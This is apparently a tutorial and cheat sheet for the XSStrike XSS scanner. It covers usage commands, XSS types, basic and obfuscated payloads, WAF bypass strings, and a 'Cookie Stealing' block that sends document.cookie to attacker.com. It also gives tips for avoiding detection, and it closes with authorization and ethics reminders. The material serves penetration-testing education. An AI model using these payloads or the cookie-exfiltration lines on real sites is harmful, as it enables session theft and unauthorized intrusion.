# ⚡ XSStrike - Advanced XSS Detection and Exploitation

> Most advanced XSS detection suite with powerful crawling and fuzzing capabilities

---

## 📋 Overview

**XSStrike** is an advanced Cross-Site Scripting (XSS) detection and exploitation suite. It's a Python-based tool that comes with intelligent payload generation, WAF detection and evasion, crawling, and fuzzing capabilities. Unlike basic XSS scanners, XSStrike uses context analysis and multiple encoding techniques to find complex XSS vulnerabilities.

**Key Features:**
- 🎯 Context-aware payload generation
- 🛡️ WAF detection and evasion techniques
- 🕷️ Built-in crawler for comprehensive scanning
- 🔄 Fuzzing capabilities for parameter testing
- 📊 DOM, Reflected, and Stored XSS detection
- 🎨 Beautiful colored output
- 💾 Saves results for later analysis

---

## 🛠️ Installation

### Clone from GitHub
```bash
# Clone the repository
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike

# Install dependencies
pip3 install -r requirements.txt

# Run XSStrike
python3 xsstrike.py -h
```

### Create Alias (Optional)
```bash
# Add to ~/.bashrc or ~/.zshrc
alias xsstrike='python3 /path/to/XSStrike/xsstrike.py'
```

---

## 📚 Basic Usage

### Simple XSS Testing
```bash
# Test a single URL
python3 xsstrike.py -u "http://target.com/page?param=value"

# Test with POST data
python3 xsstrike.py -u "http://target.com/form" --data "name=test&email=test@test.com"

# Test multiple parameters
python3 xsstrike.py -u "http://target.com/search?q=test&type=all&sort=date"
```

### Crawling Mode
```bash
# Crawl and test
python3 xsstrike.py -u "http://target.com" --crawl

# Crawl with depth limit
python3 xsstrike.py -u "http://target.com" --crawl -l 2

# Crawl specific path
python3 xsstrike.py -u "http://target.com/blog" --crawl
```

### Fuzzing Mode
```bash
# Fuzz parameters
python3 xsstrike.py -u "http://target.com/page?param" --fuzzer

# Fuzz with custom wordlist
python3 xsstrike.py -u "http://target.com/page?param" --fuzzer -w custom.txt
```

---

## 🎯 Advanced Features

### WAF Detection and Evasion
```bash
# Detect WAF
python3 xsstrike.py -u "http://target.com/page?param=value" --waf

# Skip WAF detection
python3 xsstrike.py -u "http://target.com/page?param=value" --skip-waf

# Custom encoding for evasion
python3 xsstrike.py -u "http://target.com/page?param=value" --encode
```

### Custom Headers and Cookies
```bash
# Add custom headers
python3 xsstrike.py -u "http://target.com/page?param=value" \
    --headers "X-Forwarded-For: 127.0.0.1"

# Use cookies
python3 xsstrike.py -u "http://target.com/page?param=value" \
    --cookie "session=abc123; user=admin"

# From file
python3 xsstrike.py -u "http://target.com" --headers headers.txt
```

### Payload Customization
```bash
# Use specific payload
python3 xsstrike.py -u "http://target.com/page?param=value" \
    --payload "<script>alert(1)</script>"

# Custom payload file
python3 xsstrike.py -u "http://target.com/page?param=value" \
    --file payloads.txt

# Skip DOM based scanning
python3 xsstrike.py -u "http://target.com/page?param=value" --skip-dom
```

### Blind XSS Testing
```bash
# Use XSS Hunter or similar
python3 xsstrike.py -u "http://target.com/page?param=value" \
    --blind "https://your-xss-hunter.com/unique-id"
```

---

## 💡 Real-World Scenarios

### Scenario 1: Testing Search Functionality
```bash
# Test search with crawling
python3 xsstrike.py -u "http://target.com/search?q=test" --crawl -l 1

# Test with different encodings
python3 xsstrike.py -u "http://target.com/search?q=test" --encode
```

### Scenario 2: Testing Contact Forms
```bash
# POST data testing
python3 xsstrike.py -u "http://target.com/contact" \
    --data "name=John&email=test@test.com&message=Hello" \
    --fuzzer
```

### Scenario 3: Testing Behind Authentication
```bash
# Authenticated testing
python3 xsstrike.py -u "http://target.com/dashboard?tab=profile" \
    --cookie "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
    --crawl
```

### Scenario 4: API Endpoint Testing
```bash
# Test API with JSON
python3 xsstrike.py -u "http://target.com/api/user" \
    --data '{"username":"admin","role":"user"}' \
    --headers "Content-Type: application/json"
```

### Scenario 5: Comprehensive Site Audit
```bash
# Full site scan
python3 xsstrike.py -u "http://target.com" \
    --crawl -l 3 \
    --fuzzer \
    --skip-dom \
    --timeout 10 \
    -t 10
```

---

## 🔍 Understanding XSS Types

### Reflected XSS
- Payload is part of the request
- Immediately reflected in response
- Most common type
- Example: `http://site.com?search=<script>alert(1)</script>`

### Stored/Persistent XSS
- Payload is stored on server
- Executed when page is loaded
- More dangerous
- Example: Comment form, profile fields

### DOM-based XSS
- Vulnerability in client-side code
- Never sent to server
- Exploits JavaScript execution
- Example: `location.hash` manipulation

### Blind XSS
- Payload executed in different context
- Requires out-of-band detection
- Common in admin panels, logs
- Example: User-Agent based XSS

---

## 🎓 XSS Payload Examples

### Basic Payloads
```html
<!-- Alert box -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

<!-- Image tag -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(document.domain)>

<!-- Body tag -->
<body onload=alert(1)>
```

### Advanced/Obfuscated Payloads
```html
<!-- Case manipulation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- HTML encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode encoding -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Filter bypass -->
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```

### Cookie Stealing
```html
<!-- Simple cookie stealer -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- Using image -->
<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>

<!-- XSS Hunter -->
<script src="https://your-xss-hunter.com/unique-id"></script>
```

---

## 🛡️ WAF Bypass Techniques

### Common Bypasses
```html
<!-- Comment breaking -->
<scr<!--comment-->ipt>alert(1)</script>

<!-- Tag breaking -->
<scr<script>ipt>alert(1)</script>

<!-- Null byte -->
<scri%00pt>alert(1)</script>

<!-- HTML entities -->
<img src=x onerror="&#97;lert(1)">

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<marquee onstart=alert(1)>
```

---

## 📊 Command Reference

### Common Options
```bash
-u, --url           Target URL
-d, --data          POST data
--crawl             Crawl the website
-l, --level         Crawl depth (default: 2)
--fuzzer            Fuzzer mode
--blind             Blind XSS payload
--skip-dom          Skip DOM XSS scanning
--skip-waf          Skip WAF detection
--headers           Add custom headers
--cookie            Add cookies
-t, --threads       Number of threads
--timeout           Timeout in seconds
--payload           Use specific payload
--file              Load payloads from file
--encode            Use encoding
```

---

## 🚨 Best Practices

### Testing Approach
1. **Start with basic payloads** - Test simple cases first
2. **Understand the context** - Where is input reflected?
3. **Check encoding** - How is input processed?
4. **Test all parameters** - Don't miss hidden fields
5. **Try different vectors** - Multiple injection points

### Avoiding Detection
- Use delays between requests (`--timeout`)
- Rotate user agents
- Use proxy chains
- Test during off-peak hours
- Limit thread count

### Responsible Testing
- Only test authorized targets
- Don't damage or disrupt services
- Report findings responsibly
- Keep proof-of-concepts non-destructive
- Follow bug bounty rules

---

## 🔧 Integration with Other Tools

### With Burp Suite
```bash
# Send requests through Burp proxy
python3 xsstrike.py -u "http://target.com" --proxy http://127.0.0.1:8080
```

### With OWASP ZAP
```bash
# Use ZAP as proxy
python3 xsstrike.py -u "http://target.com" --proxy http://127.0.0.1:8081
```

### With Custom Scripts
```python
# Use XSStrike programmatically
from xsstrike import scan
results = scan("http://target.com/page?param=value")
```

---

## ⚠️ Common Issues and Solutions

### Issue: No XSS Found
- Try different payload types
- Check if input is properly reflected
- Look for filter bypasses
- Test in different contexts (HTML, JS, attributes)

### Issue: WAF Blocking
- Enable WAF evasion (`--encode`)
- Use time delays
- Try different payload encodings
- Manual testing with custom payloads

### Issue: False Positives
- Verify manually in browser
- Check if payload actually executes
- Consider context and filtering

---

## 📖 Learning Resources

- **Official Repository**: [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
- **PortSwigger XSS**: [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
- **OWASP XSS Guide**: [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
- **TryHackMe**: XSS rooms and challenges
- **HackTricks XSS**: Comprehensive XSS methodology

---

## ⚖️ Legal and Ethical Use

XSStrike is a powerful testing tool. Always ensure:
- ✅ You have written authorization
- ✅ Testing is within defined scope
- ✅ You follow responsible disclosure
- ✅ Don't steal data or cause harm
- ❌ Never test unauthorized systems
- ❌ Don't weaponize findings

---

## 🔗 Related Tools

- **Dalfox** - Fast XSS scanner
- **XSSer** - Automatic XSS detection
- **Burp Suite XSS Extensions** - Professional testing
- **Browser Developer Tools** - Manual verification

---

*Master XSS detection with context awareness. Test ethically, report responsibly.*
